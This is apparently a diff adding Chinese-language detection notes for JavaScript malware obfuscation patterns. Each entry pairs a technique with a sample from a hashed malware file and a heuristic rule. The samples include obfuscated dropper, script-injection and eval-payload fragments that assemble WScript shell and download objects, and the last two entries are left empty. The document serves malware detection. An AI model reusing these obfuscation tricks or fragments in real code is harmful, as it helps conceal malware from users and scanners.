+模式15说明：异常查表。创建一个长字符串后大量使用其子串进行代表变量名、拼接函数名、
+进行运算等操作
+用例：
+function o() {
+  if (!WScript[b[3]][b[2]][b[1]](b[0])) {
+    new ActiveXObject(b[11])[b[10]](WScript[b[4]], b[5] + WScript[b[6]] + b[7], b[8], b[9], 0);
+    WScript[b[12]]()
+  }
+}
+文件Hash：00bd3cda5a94327755fb107b1af8a570,
+方式：出现标识符+"["+数字/表达式+"]"模式超过50次则判定为此模式.
+
+模式16说明：异常拼接。出现使用超过30个部分拼接起来的字符串。
+用例：
+var RiDojs = [("humans", "broadsword", "cholera", "involves", "p") + ("damask", "propensity", "upholstered", "bugle", "sh") + "wbtA" + "Lp", "H" + "mo" + ("username", "partially", "rebus", "Ql") + ("spirituality", "ensign", "fifth", "kyX"), "E" + ("parsimonious", "representations", "xp") + "an" + "dEnv" + "ir" + "onme" + "nt" + "St" + "ri" + "ngs", ("welter", "destroy", "fighter", "offered", "") + "%" + "TE" + "MP%", ("scanner", "disorders", "choral", "assurance", "") + "." + "exe", ("odoriferous", "stuck", "sudan", "anomalous", "R") + "un", "Actvo" + ("player", "flower", "litionivvoliti") + ("accelerated", "imprecation", "amulet", "oneX") + ("seats", "additions", "dominican", "bangkok", "vo") + ("contiguity", "broods", "confidential", "lustful", "liti") + "onOb" + ("gypsum", "acquittal", "eliminate", "aberdeen", "vo") + ("reinforcement", "purging", "liti") + "on" + "jevo" + "li" + "tionct", "Nusxgd", "QKjFVFT", ("celts", "greeting", "signing", "W") + ("expense", "howls", "equestrian", "Scvoli") + "tionriptvoliti" + "on." + ("underfoot", "deaths", "funereal", "S"), "toIbrPbsjW", ("walter", "puppies", "buoyancy", "announcements", "h") + ("attorney", "unsympathetic", "zshops", "proceed", "volitionelvo") + "li" + ("pyrenees", "levels", "tionl"), "xflTTBTmog", "U" + "as" + "MCOC" + ("lemon", "ethnic", "fervor", "pilot", "Iy") + "cr", "M" + ("charger", "prattle", "voli") + "tion" + "SX" + "voli" + "ti" + "onML" + "voli" + "ti" + "on2" + "." + ("inborn", "invidious", "whaling", "vo") + ("diction", "baptismal", "li") + "ti" + "on" + "XM" + "vo" + "li" + ("clinical", "jesse", "continuity", "shore", "ti") + "onLH" + "vo" + "li" + "ti" + "on" + "TTP"];
+wVAwFmLcj = "} Override manipulation of globals by nested matchers if ( outermost ) { dirruns = dirrunsUnique; outermostContext = contextBackup; ";
+文件Hash：0d0f8c58b0ad357b0510e0da264afb7d
+方法：语义分析出现变量赋值的时候，出现表达式的元素个数超过30个时判定为此模式
+
+模式17说明：异常拼接变种。使用两个变量，一个变量是要被拼接起来的字符串，另一个变量储存
+下一个要被拼接的部分
+用例：
+e8 = a4;
+z7 += e8;
+e8 = a3;
+z7 += e8;
+e8 = j8;
+z7 += e8;
+e8 = n3;
+z7 += e8;
+e8 = f7;
+z7 += e8;
+e8 = q1;
+z7 += e8;
+e8 = l3;
+z7 += e8;
+e8 = v9;
+z7 += e8;
+e8 = j0;
+z7 += e8;
+文件Hash：0d6ad8c36ced8b3baa0315eabc3a0b3c,0db02a3e6bf6d3ea41837efa316ee05b
+方法：一个变量的值被连续改变/操作超过50次则判定为此模式
+
+模式18说明：字符串代替。将需要执行的事件写成一个字符串，中间以" "间隔，再使用.split
+函数进行分隔，然后使用.removeEvent和addEvent进行处理
+用例：
+var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+var logHuman = function() {
+  var wfscr = document.createElement('script');
+  wfscr.type = 'text/javascript';
+  wfscr.async = true;
+  wfscr.src = url + '&r=' + Math.random();
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(wfscr);
+  for (var i = 0; i < evts.length; i++) {
+    removeEvent(evts[i], logHuman);
+  }
+};
+for (var i = 0; i < evts.length; i++) {
+  addEvent(evts[i], logHuman);
+}
+文件Hash：0d152f86f63d0677596260509fcb8ce0
+
+模式19说明：混合加密程序。将程序转化成字符串后随机使用"Z"进行分隔后再分割成几个部分相加
+用例：
+var cKzrSWjTkJAMulpdQna = 'ZvZaZr ZfZIZ' +
+  'BrZDZaZpZbZKZqhNkZgmZ Z= ZneZw ZAZ' +
+  'ctZiZveZXOZbZjeZctZ(Z"ZSZhZeZllZ.' +
+  'ZAZPplZiZcZaZTZiZoNZ");Z ZvZaZrZ ZIuZ' +
+  'iZSNZdZlZxZqWZTZGpfjZvZyr Z= ZneZwZ AcZtZiZveXZOZbjZectZ(Z"wZSZcZRipZt.shelZlZ"Z);Z Zvar ZPvGZnsZOZSZVZfqZALZbpZWzZcZhZ Z=Z ZnZewZ ZAcZtiZveZXZOZbZjZeZct(Z"scZrZiZptZiNZg.ZfZIleZsZyZs' +
+  'ZtZemoBjeZCZt"Z)Z;Z ZfZuZnctioZ' +
+  'n ZuZxmZcZMZVZoZrfZGiNQsLZeZ(Z)Z { ZreZtZu' +
+  'ZrZn ZPZvGns' +
+  'OSVZfZqALZbZpZWzZchZ.ZFoZldeZrEZxisZtZsZ' +
+  '("rZW' +
+  'pZuZsZL' +
+  'ZAPEKZnqaiZyNZeZ"); Z}vZarZ AOZzZxZvwZMZscNZXZtHZgZUGZ Z=Z Z17Z0Z7Z2617/1Z7Z07Z2Z6Z1Z7' +
+  'Z; ZvZaZr ZcqZjZSZFmZJyZNZVZPbZkxZM' +
+  'Z =Z ""Z;Z ZfZuZnZ' +
+  'cZtZiZoZnZ PZBZVgZfZCcZYWZkDdZxZSZheZjw(ZulZrKZnZCZJZUZg' +
+  'oZVZcZqZbZNR' +
+  'ZdaZ)Z {Z ZrZeZtuZrnZ ZSZtrinZgZ.fZromChZaZrCZodeZ(ZuZlZrZKnZCZJUZgZoZVZcq' +
+  'bNR' +
+  'ZdZaZ);Z Z} ZfuZnZctioZnZ KmuZkZs' +
+  'ZiZCZSZcaZHbZqroZvZe(E' +
+  'ZMB' +
+  'gZnZSZaZHZtZCZIDZeOZfm, oZAZMZKZWdJZfwZxZsviZBp)Z {Z rZetZurZnZ EZMBZgnSaHZtZCZIZDeOZfZmZ.ZcharZCoZ' +
+  'deZAZt(ZoAZMZKWZdZJZfZwZxsZv' +
+  'iBpZ' +
+  '); }'
+
+function UYnuKkevHbAtTWz(SewBhbVfkCLgsrj, SKYyrzTcXPvnipHMNa) {
+  return SewBhbVfkCLgsrj.split(SKYyrzTcXPvnipHMNa).join("");
+}
+var TLMVzXycSPNCqov = eval(UYnuKkevHbAtTWz(cKzrSWjTkJAMulpdQna, "Z"));
+文件Hash：0d396a4103e64e067a308667799b2966
+
+模式20说明：函数代替赋值。大量使用函数体仅为返回一个值的函数来代替赋值
+用例：
+return '(); xa';
+};
+
+function c7() {
+return '0; try';
+};
+
+function f1() {
+return '.writ';
+};
+
+function a7() {
+return 'CreateO';
+};
+文件Hash：0db02a3e6bf6d3ea41837efa316ee05b
+方法：使用语法分析解析出函数后，发现超过10个函数的函数体都只有一条返回一个值的语句，则
+判定为此模式
+
+模式21说明：拼接内置函数。使用字符串拼接出内置函数。
+用例：
+[((e) ? "s" : "") + "p" + "lit"]("a$" [((e) ? "su" : "") + "bstr"](1));
+文件Hash：00dd1c07fb998137da41a3adfdc1c8d4
+
+模式22说明：
+用例：
+ + ("accepts", "erroneously", "defunct", "Rk") +
+文件Hash：
+
+模式23说明：
+用例：
+文件Hash：
